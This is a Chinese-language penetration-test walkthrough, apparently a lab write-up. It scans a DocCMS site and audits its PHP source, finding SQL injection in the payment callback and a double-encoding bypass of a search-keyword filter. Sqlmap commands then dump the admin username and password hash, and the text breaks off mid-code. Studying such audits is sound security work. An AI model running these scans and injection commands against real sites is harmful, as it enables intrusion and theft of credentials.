+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.47.48.png" alt="截屏2022-06-26 18.47.48"></p>
+<p>使用 nmap 对 masscan 扫描到的端口进行具体的信息探测</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p 21,80,888,3306,8888 -sC -Pn 192.168.0.105</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-26%2018.51.58.png" alt="截屏2022-06-26 18.51.58"></p>
+<h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p>访问域名后界面为 DocCMS，站点采用的中间件为 Apache<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-27%2001.08.05.png" alt="截屏2022-06-27 01.08.05"></p>
+<p>使用 whatweb 对站点进行指纹识别</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whatweb http://www.ddd4.com</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-28%2004.29.34.png" alt="截屏2022-06-28 04.29.34"></p>
+<p>使用 gobuster 对域名站点目录扫描，通过 grep 去除重复结果</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://www.ddd4.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -x &#x27;php,zip,html,rar&#x27; -o ddd4_com.txt --wildcard | grep -v 11807 | grep -v &quot;Size: 49&quot;</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-28%2004.27.34.png" alt="截屏2022-06-28 04.27.34"></p>
+<h4 id="888端口"><a href="#888端口" class="headerlink" title="888端口"></a>888端口</h4><p>访问后显示 403，因此可能需要身份验证后才能访问<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-06-28%2004.20.34.png" alt="截屏2022-06-28 04.20.34"></p>
+<h4 id="3306端口"><a href="#3306端口" class="headerlink" title="3306端口"></a>3306端口</h4><p>3306 为 MySQL 数据库的默认端口，使用爆破弱口令无果</p>
+<h4 id="8888端口"><a href="#8888端口" class="headerlink" title="8888端口"></a>8888端口</h4><p>访问后宝塔后台界面，如果想要访问登录面板，则需要爆破8位数路径<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-12%2002.27.30.png" alt="截屏2022-07-12 02.27.30"></p>
+<h3 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h3><h4 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h4><p>由于目标站点模板采用的是 DocCMS，因此我们可以直接到<a target="_blank" rel="noopener" href="http://www.doccms.com/">目标官网</a>当中下载源码，解压后利用 Seay 源代码审计工具进行漏洞审计<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-04%2001.12.57.png" alt="截屏2022-07-04 01.12.57"></p>
+<p>针对站点的主界面<code>/index.php</code>进行查看，其中可通过 lang 参数传递中文还是英文界面，指定<code>/config/doc-config-</code>为该 CMS 的配置文件。如果 CMS 尚未安装，则会包含<code>/inc/nosetup/setup.html</code>文件来进行自动安装，与此同时被包含的文件还有<code>/admini/config/qd-config.php</code>和<code>/loader/load.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>] = SITELANGUAGE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;lang&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;lang&#x27;</span>],<span class="keyword">array</span>(<span class="string">&#x27;cn&#x27;</span>,<span class="string">&#x27;en&#x27;</span>)))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;lang&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$docConfigLock</span> = <span class="variable">$dirName</span>.<span class="string">&#x27;/config/doccms.lock&#x27;</span>;</span><br><span class="line"><span class="variable">$docConfig</span>=<span class="variable">$dirName</span>.<span class="string">&#x27;/config/doc-config-&#x27;</span>.<span class="variable">$_SESSION</span>[TB_PREFIX.<span class="string">&#x27;doclang&#x27;</span>].<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!is_file(<span class="variable">$docConfig</span>)||filesize(<span class="variable">$docConfig</span>)==<span class="number">0</span>||filesize(<span class="variable">$docConfig</span>)==<span class="number">3</span>||!is_file(<span class="variable">$docConfigLock</span>))&#123;<span class="keyword">require_once</span>(<span class="variable">$dirName</span>.<span class="string">&#x27;/inc/nosetup/setup.html&#x27;</span>);<span class="keyword">exit</span>;&#125;<span class="keyword">else</span>&#123;<span class="keyword">require_once</span>(<span class="variable">$docConfig</span>);&#125;</span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH.<span class="string">&#x27;/admini/config/qd-config.php&#x27;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH.<span class="string">&#x27;/loader/load.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+<p><code>/admini/config/qd-config.php</code>是关于语言包的配置文件，重点来看看<code>/loader/load.php</code>，顾名思义其中都是加载页面的函数，但其中包含的<code>/loader/doc.php</code>引起了我的注意。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$url_this</span>=<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REWRITE_URL&#x27;</span>]) ? <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_REWRITE_URL&#x27;</span>] : <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>];</span><br><span class="line"><span class="variable">$url_this</span>=substr(<span class="variable">$url_this</span>,<span class="number">1</span>,strlen(<span class="variable">$url_this</span>)-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//default  加载模板下的引导页</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$url_this</span>)&#123;	</span><br><span class="line">	<span class="variable">$skinRoot</span>=get_abs_skin_root();</span><br><span class="line">	<span class="variable">$default</span>=<span class="keyword">array</span>(<span class="string">&#x27;default.html&#x27;</span>,<span class="string">&#x27;default.htm&#x27;</span>,<span class="string">&#x27;default.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">foreach</span>(<span class="variable">$default</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">		<span class="keyword">if</span>(is_file(<span class="variable">$skinRoot</span>.<span class="variable">$v</span>))&#123;</span><br><span class="line">			<span class="variable">$htmlfile</span>=<span class="variable">$skinRoot</span>.<span class="variable">$v</span>;</span><br><span class="line">			<span class="keyword">include</span>(<span class="variable">$htmlfile</span>);</span><br><span class="line">			<span class="keyword">exit</span>();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH.<span class="string">&#x27;/loader/doc.php&#x27;</span>);</span><br><span class="line"><span class="comment">//静态化 URL强制跳转</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">HTML_load</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//页面加载</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">PAGE_load</span>(<span class="params"><span class="variable">$include</span></span>)</span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>/loader/doc.php</code>中发现<code>cleanArrayForMysql</code>函数针对请求值进行了过滤，<code>$_REQUEST</code>、<code>$_GET</code>、<code>$_POST</code>则代表客户端的请求方法，因此需要寻找<code>cleanArrayForMysql</code>函数的位置以确定该函数是否可绕过，同时也要寻找未被该函数过滤的请求值，因为其可能存在SQL注入漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span> = cleanArrayForMysql(<span class="variable">$_REQUEST</span>);</span><br><span class="line"><span class="variable">$_GET</span>     = cleanArrayForMysql(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="variable">$_POST</span>    = cleanArrayForMysql(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$request</span>  = <span class="variable">$_REQUEST</span>;</span><br><span class="line"><span class="variable">$menu_arr</span>=<span class="keyword">array</span>();</span><br></pre></td></tr></table></figure>
+<p>在<code>/inc/function.php</code>找到了<code>cleanArrayForMysql</code>函数，它开启了GPC转义，与此同时还发现了<code>checkSqlStr</code>函数，它已对存在SQL注入风险的敏感字符进行过滤。因此在之后的审计中也要关注<code>checkSqlStr</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cleanArrayForMysql</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!get_magic_quotes_gpc())</span><br><span class="line">		<span class="keyword">return</span> (is_array(<span class="variable">$data</span>))?array_map(<span class="string">&#x27;cleanArrayForMysql&#x27;</span>, <span class="variable">$data</span>):mysql_real_escape_string(<span class="variable">$data</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkSqlStr</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$string</span> = strtolower(<span class="variable">$string</span>);</span><br><span class="line">	<span class="keyword">return</span> preg_match(<span class="string">&#x27;/select|insert|update|delete|\&#x27;|\/\*|\*|\.\.\/|\.\/|union|into|load_file|outfile|_user/i&#x27;</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h4><p>在<code>/inc/pay/alipay.php</code>中发现其请求参数值并未受到<code>cleanArrayForMysql</code>和<code>checkSqlStr</code>这两个函数的保护，同时它被直接带入了SQL语句当中，因此存在SQL注入点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$out_trade_no</span>	= <span class="variable">$_GET</span>[<span class="string">&#x27;out_trade_no&#x27;</span>];<span class="comment">//获取订单号</span></span><br><span class="line"><span class="variable">$trade_no</span>		= <span class="variable">$_GET</span>[<span class="string">&#x27;trade_no&#x27;</span>];	<span class="comment">//获取支付宝交易号</span></span><br><span class="line"><span class="variable">$total_fee</span>		= <span class="variable">$_GET</span>[<span class="string">&#x27;total_fee&#x27;</span>];<span class="comment">//获取总价格</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="variable">$sql</span> =<span class="string">&quot;UPDATE &quot;</span>.TB_PREFIX.<span class="string">&quot;product_order SET ispay= 1 ,payprice= &quot;</span>.(<span class="variable">$total_fee</span>).<span class="string">&quot; WHERE orderId = &#x27;&quot;</span>.<span class="variable">$out_trade_no</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+<p>在<code>/content/search/index.php</code>中发现第二个注入点，虽然<code>keyword</code>参数被<code>checkSqlStr</code>函数所约束，但是通过<code>urldecode</code>函数可以帮助我们绕过限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">!checkSqlStr(<span class="variable">$request</span>[<span class="string">&#x27;keyword&#x27;</span>])? <span class="variable">$request</span>[<span class="string">&#x27;keyword&#x27;</span>] = <span class="variable">$request</span>[<span class="string">&#x27;keyword&#x27;</span>] : <span class="keyword">exit</span>(<span class="string">&#x27;非法字符&#x27;</span>);</span><br><span class="line"><span class="variable">$keyword</span> = urldecode(<span class="variable">$request</span>[<span class="string">&#x27;keyword&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$modelName</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;article&#x27;</span>:</span><br><span class="line">			<span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM &quot;</span>.TB_PREFIX.<span class="string">&quot;article WHERE title LIKE &#x27;%&quot;</span>.<span class="variable">$keyword</span>.<span class="string">&quot;%&#x27; OR content LIKE &#x27;%&quot;</span>.<span class="variable">$keyword</span>.<span class="string">&quot;%&#x27; ORDER BY id DESC&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;list&#x27;</span>:</span><br><span class="line">			<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM &quot;</span>.TB_PREFIX.<span class="string">&quot;list WHERE  title LIKE &#x27;%&quot;</span>.<span class="variable">$keyword</span>.<span class="string">&quot;%&#x27; OR content LIKE &#x27;%&quot;</span>.<span class="variable">$keyword</span>.<span class="string">&quot;%&#x27; ORDER BY id DESC&quot;</span>;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">      ...</span><br><span class="line">		<span class="keyword">default</span>: <span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$db</span>-&gt;get_results(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
+<p>尝试使用<code>search?keyword=1&#39;</code>经过一次URL编码，但是结果显示非法字符<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2004.27.08.png" alt="截屏2022-07-10 04.27.08"></p>
+<p>尝试进行二次编码，结果目标显示报错语句，说明可能存在二次编码注入<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2004.29.02.png" alt="截屏2022-07-10 04.29.02"></p>
+<p>使用 sqlmap 指定二次编码脚本进行测试，结果显示确实存在SQL注入漏洞</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search?keyword=11&quot; --tamper chardoubleencode --batch -p keyword </span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-08%2004.40.34.png" alt="截屏2022-07-08 04.40.34"><br>使用 sqlmap 查找库名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search?keyword=11&quot; --tamper chardoubleencode --batch -p keyword --dbs</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.10.12.png" alt="截屏2022-07-10 05.10.12"><br>使用 sqlmap 查找 www_ddd4_com 的表名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search?keyword=11&quot; --tamper chardoubleencode --batch -p keyword -D www_ddd4_com --tables</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.11.14.png" alt="截屏2022-07-10 05.11.14"></p>
+<p>使用 sqlmap 查找 doc_user 表中的列名</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search?keyword=11&quot; --tamper chardoubleencode --batch -p keyword -D www_ddd4_com -T doc_user --columns</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.16.09.png" alt="截屏2022-07-10 05.16.09"></p>
+<p>使用 sqlmap 导出账号密码信息</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search?keyword=11&quot; --tamper chardoubleencode --batch -p keyword -D www_ddd4_com -T doc_user -C username,pwd --dump</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.17.24.png" alt="截屏2022-07-10 05.17.24"></p>
+<p>成功拿到管理员账号密码，但是拿到的密文并不能直接解密</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin/9430q1yc97c94304a6sy04ef5f8b2l42f136e0s8d423d5d0uj259f85af8n0547x28f21yc97c</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.18.23.png" alt="截屏2022-07-10 05.18.23"></p>
+<p>查看当前用户权限为普通用户，因此也无法直接获取权限。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://www.ddd4.com/search?keyword=11&quot; --tamper chardoubleencode --batch -p keyword --current-user</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/481150ce/%E6%88%AA%E5%B1%8F2022-07-10%2005.23.51.png" alt="截屏2022-07-10 05.23.51"></p>
+<p>查看用于管理员登录的代码文件<code>/admini/login.php</code>，其中的 checkPwd 函数首先会用户名进行判断，如果用户名存在才会检查密码，密码的检测需要依赖<code>docEncryption</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPwd</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$pwd</span>,<span class="variable">$flag</span>=<span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!checkSqlStr(<span class="variable">$username</span>))</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM &quot;</span>.TB_PREFIX.<span class="string">&quot;user WHERE username=&#x27;<span class="subst">$username</span>&#x27; LIMIT 1&quot;</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;非法字符&#x27;</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="variable">$rst</span>=<span class="variable">$db</span>-&gt;get_row(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$rst</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$docEncryption</span> = <span class="keyword">new</span> docEncryption(<span class="variable">$pwd</span>);</span><br><span class="line">		...</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在<code>/inc/class.docencryption.php</code>中找到该加密函数，显而易见的是密码经过了 Sha1 以及 md5 双重加密，因此导致密码不可能逆向破解。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">docEncryption</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">var</span> <span class="variable">$enstr</span> = <span class="literal">null</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">docEncryption</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span 